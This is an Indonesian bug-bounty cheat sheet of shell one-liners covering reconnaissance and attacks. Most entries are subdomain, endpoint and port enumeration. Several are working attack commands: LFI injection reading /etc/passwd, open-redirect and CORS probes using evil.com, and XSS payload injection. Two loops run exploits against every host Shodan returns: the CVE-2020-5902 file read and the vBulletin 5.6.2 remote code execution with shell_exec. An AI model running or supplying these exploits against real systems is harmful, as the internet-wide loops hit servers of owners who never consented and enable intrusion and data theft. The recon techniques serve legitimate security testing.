# Awesome One-liners for Bug Bounty – Penjelasan & Panduan Praktis

Kumpulan one-liner berikut ini adalah skrip singkat yang sangat berguna untuk otomasi, enumerasi, dan deteksi bug pada proses bug bounty atau pentest web. Di bawah ini tersedia penjelasan detail dan contoh cara pakai untuk setiap kategori, sehingga cocok sebagai referensi belajar.

---

## Daftar Isi

- [Definisi Placeholder](#definisi-placeholder)
- [One-liner dan Penjelasan](#one-liner-dan-penjelasan)
  - [1. Local File Inclusion (LFI)](#1-local-file-inclusion-lfi)
  - [2. Open Redirect](#2-open-redirect)
  - [3. XSS (Cross-Site Scripting)](#3-xss-cross-site-scripting)
  - [4. Prototype Pollution](#4-prototype-pollution)
  - [5. CVE Exploits](#5-cve-exploits)
  - [6. vBulletin 5.6.2 RCE](#6-vbulletin-562-rce)
  - [7. Find JavaScript Files](#7-find-javascript-files)
  - [8. Extract Endpoints from JavaScript](#8-extract-endpoints-from-javascript)
  - [9. Get CIDR & Org Information](#9-get-cidr--org-information)
  - [10. Get Subdomains (Dari Berbagai Sumber)](#10-get-subdomains-dari-berbagai-sumber)
  - [11. Subdomain Bruteforce](#11-subdomain-bruteforce)
  - [12. Find Allocated IP Ranges for ASN](#12-find-allocated-ip-ranges-for-asn)
  - [13. Extract IPs from a File](#13-extract-ips-from-a-file)
  - [14. Port Scan tanpa CloudFlare](#14-port-scan-tanpa-cloudflare)
  - [15. Create Custom Wordlists](#15-create-custom-wordlists)
  - [16. Extract Juicy Informations](#16-extract-juicy-informations)
  - [17. Find Subdomains TakeOver](#17-find-subdomains-takeover)
  - [18. Dump Custom URLs from ParamSpider](#18-dump-custom-urls-from-paramspider)
  - [19. URLs Probing with cURL + Parallel](#19-urls-probing-with-curl--parallel)
  - [20. Dump In-scope Assets dari Bug Bounty List](#20-dump-in-scope-assets-dari-bug-bounty-list)
  - [21. Dump URLs from sitemap.xml](#21-dump-urls-from-sitemapxml)
  - [22. Pure Bash Linkfinder](#22-pure-bash-linkfinder)
  - [23. Extract Endpoints from swagger.json](#23-extract-endpoints-from-swaggerjson)
  - [24. CORS Misconfiguration](#24-cors-misconfiguration)
  - [25. Find Hidden Servers & Admin Panels](#25-find-hidden-servers--admin-panels)
  - [26. Recon Using api.recon.dev](#26-recon-using-apireconde)
  - [27. Find Live Host/Domain/Assets](#27-find-live-hostdomainassets)
  - [28. XSS tanpa gf](#28-xss-tanpa-gf)
  - [29. Get Subdomains from IPs](#29-get-subdomains-from-ips)
  - [30. Gather Domains from Content-Security-Policy](#30-gather-domains-from-content-security-policy)
  - [31. Nmap IP:PORT Parser Piped to HTTPX](#31-nmap-ipport-parser-piped-to-httpx)

---

## Definisi Placeholder

- **HOST**: Hostname, subdomain, atau IP (misal: domain.com, sub.domain.com, 127.0.0.1)
- **HOSTS.txt**: File berisi daftar HOST.
- **URL**: Alamat URL (misal: http://domain.com/path).
- **URLS.txt**: File berisi daftar URL.
- **FILE.txt**: File input/output sesuai konteks one-liner.
- **OUT.txt**: File hasil output dari proses one-liner.

---

## One-liner dan Penjelasan

### 1. Local File Inclusion (LFI)

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

**Penjelasan:**  
- Mencari URL yang rentan LFI, mengganti parameter menjadi `/etc/passwd`, lalu cek apakah file tersebut bisa dibaca oleh server.
- **Cara pakai:**  
  - Install: gau, gf, qsreplace, curl.
  - Jalankan: `gau example.com | gf lfi | qsreplace "/etc/passwd" | xargs ...`
  - Hasil: Jika ada output "VULN! <url>", berarti LFI ditemukan.

---

### 2. Open Redirect

```bash
export LHOST="https://evil.com"; gau HOST | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

**Penjelasan:**  
- Mencari parameter redirect, mengganti value menjadi domain luar, lalu cek apakah server melakukan redirect ke domain tersebut.
- **Cara pakai:**  
  - Set LHOST: `export LHOST="https://evil.com"`
  - Jalankan: `gau example.com | gf redirect ...`
  - Hasil: URL yang rentan open redirect.

---

### 3. XSS (Cross-Site Scripting)

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt
```

**Penjelasan:**  
- Mengumpulkan parameter yang berpotensi XSS, lalu diuji dengan dalfox menggunakan payload otomatis.
- **Cara pakai:**  
  - Ganti `YOURS.xss.ht` dengan domain burp collaborator/XSS hunter-mu.
  - Jalankan seperti di atas.

---

### 4. Prototype Pollution

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" :""'
```

**Penjelasan:**  
- Menemukan subdomain, cek URL, lalu uji parameter `__proto__` untuk mendeteksi prototype pollution di JS.
- **Cara pakai:**  
  - Install: subfinder, httpx, anew, page-fetch.

---

### 5. CVE Exploits

Contoh: **CVE-2020-5902**
```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q "root:x" && echo "[VULNERABLE] $host"; done
```

**Penjelasan:**  
- Mencari target rentan di Shodan, lalu uji exploit CVE sesuai payload.
- **Cara pakai:**  
  - Pastikan punya akses Shodan CLI dan API key.

---

### 6. vBulletin 5.6.2 RCE

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("id");exit;' | grep uid && echo "[VULNERABLE] $host"; done
```

**Penjelasan:**  
- Eksploitasi RCE pada vBulletin dengan payload khusus.

---

### 7. Find JavaScript Files

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep "\.js" | sort -u
```

**Penjelasan:**  
- Mengumpulkan semua file JS dari domain dan subdomain.

---

### 8. Extract Endpoints from JavaScript

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

**Penjelasan:**  
- Menemukan endpoint/route tersembunyi dalam file JS.

---

### 9. Get CIDR & Org Information

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; done | uniq); done
```

**Penjelasan:**  
- Mendapatkan info jaringan dan organisasi dari daftar hostname.

---

### 10. Get Subdomains (Dari Berbagai Sumber)

**RapidDNS.io**
```bash
export host="HOST" ; curl -s "https://rapiddns.io/subdomain/$host?full=1#result" | grep -e "<td>.*$host</td>" | grep -oP '(?<=<td>)[^<]+' | sort -u
```
**BufferOver.run**
```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```
**crt.sh**
```bash
curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

**Penjelasan:**  
- Mengumpulkan subdomain dari sumber publik (RapidDNS, BufferOver, crt.sh, dll).

---

### 11. Subdomain Bruteforce

```bash
ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'
```

**Penjelasan:**  
- Melakukan bruteforce subdomain menggunakan wordlist di FILE.txt.

---

### 12. Find Allocated IP Ranges for ASN

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

**Penjelasan:**  
- Menemukan range IP dari ASN berdasarkan IP.

---

### 13. Extract IPs from a File

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

**Penjelasan:**  
- Ekstrak semua IP address dari file teks.

---

### 14. Port Scan tanpa CloudFlare

```bash
subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

**Penjelasan:**  
- Scan port pada subdomain yang tidak pakai CloudFlare.

---

### 15. Create Custom Wordlists

```bash
gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt
```

**Penjelasan:**  
- Membuat wordlist custom dari parameter dan path URL.

---

### 16. Extract Juicy Informations

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/[",]//g'; done
```

**Penjelasan:**  
- Mengambil info penting (juicy) dari OTX Alienvault berdasarkan hostname.

---

### 17. Find Subdomains TakeOver

```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 -o OUT.txt
```

**Penjelasan:**  
- Deteksi peluang subdomain takeover dari hasil enumerasi subdomain.

---

### 18. Dump Custom URLs from ParamSpider

```bash
cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;
```

**Penjelasan:**  
- Mengumpulkan URL dengan parameter menggunakan ParamSpider.

---

### 19. URLs Probing with cURL + Parallel

```bash
cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

**Penjelasan:**  
- Mengecek status HTTP banyak URL secara paralel.

---

### 20. Dump In-scope Assets dari Bug Bounty List

**HackerOne:**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

**Penjelasan:**  
- Mengambil daftar asset dari program bug bounty populer.

---

### 21. Dump URLs from sitemap.xml

```bash
curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

**Penjelasan:**  
- Mengambil seluruh URL dari sitemap.xml untuk recon endpoint.

---

### 22. Pure Bash Linkfinder

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3
```

**Penjelasan:**  
- Menemukan link dari halaman web lalu mencari endpoint di file JS-nya.

---

### 23. Extract Endpoints from swagger.json

```bash
curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'
```

**Penjelasan:**  
- Menemukan endpoint API dari file swagger.json.

---

### 24. CORS Misconfiguration

```bash
site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then echo "[Potentional CORS Found] $url"; else echo "Nothing on $url"; fi; done
```

**Penjelasan:**  
- Mengecek apakah server mengizinkan CORS dari origin sembarangan.

---

### 25. Find Hidden Servers & Admin Panels

```bash
ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
```

**Penjelasan:**  
- Fuzzing Host header untuk menemukan admin panel/hidden server.

---

### 26. Recon Using api.recon.dev

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jq .[].domain
```

**Penjelasan:**  
- Mendapatkan domain dari API recon.dev.

---

### 27. Find Live Host/Domain/Assets

```bash
subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

**Penjelasan:**  
- Menemukan subdomain yang benar-benar live/aktif.

---

### 28. XSS tanpa gf

```bash
waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
```

**Penjelasan:**  
- Cek XSS tanpa bantuan tool gf, langsung inject payload ke parameter.

---

### 29. Get Subdomains from IPs

```bash
python3 hosthunter.py HOSTS.txt > OUT.txt
```

**Penjelasan:**  
- Mengumpulkan subdomain berdasarkan IP (menggunakan hosthunter.py).

---

### 30. Gather Domains from Content-Security-Policy

```bash
curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```

**Penjelasan:**  
- Mengambil domain dari header CSP untuk mencari asset tersembunyi.

---

### 31. Nmap IP:PORT Parser Piped to HTTPX

```bash
nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
```

**Penjelasan:**  
- Scan port dengan nmap, parse hasilnya, lalu probe port HTTP(S) terbuka secara otomatis.

---

## Tips Umum

- Ganti placeholder (HOST, URL, FILE.txt, dll) sesuai target/keperluanmu.
- Install semua tools yang diperlukan sebelum menjalankan one-liner.
- Gunakan dengan bijak dan etis; hormati hukum serta aturan program bug bounty yang kamu ikuti.
- Kombinasikan beberapa one-liner untuk hasil recon dan testing yang optimal.

---

_Selamat belajar dan selamat berburu bug!_